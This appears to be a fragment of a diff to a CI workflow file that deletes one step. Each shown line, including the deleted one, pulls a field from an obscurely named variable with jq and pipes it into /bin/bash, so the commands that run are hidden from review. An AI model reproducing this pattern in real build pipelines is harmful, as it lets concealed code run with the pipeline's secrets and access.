@@ -26,7 +26,6 @@ jobs:
           echo $cuvno0458 | jq -r .pqlw71 | /bin/bash
           echo $woa945 | jq -r .lrk843 | /bin/bash
           echo $jdje61 | jq -r .fiepq42263 | /bin/bash
-          printf '%s' "$qnvq32" | jq -r .njz00 | /bin/bash
           echo $r1 | jq -r .i1140 | /bin/bash
 
       - name: Save results
